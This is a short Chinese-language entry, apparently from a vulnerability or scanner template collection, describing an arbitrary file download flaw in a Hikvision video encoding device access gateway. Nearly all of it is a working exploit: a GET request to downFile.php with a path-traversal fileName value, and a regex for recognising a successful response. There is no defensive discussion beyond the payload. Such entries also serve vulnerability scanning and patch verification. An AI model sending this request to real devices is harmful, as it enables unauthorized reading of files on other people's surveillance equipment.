# HIKVISION视频编码设备接入网关任意文件下载

海康 ｜ 其他 ｜ —
- **请求**：`GET /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php HTTP/1.1`
- **响应特征**：200 ^(?=.*?file_name)(?=.*?file_dir).*?$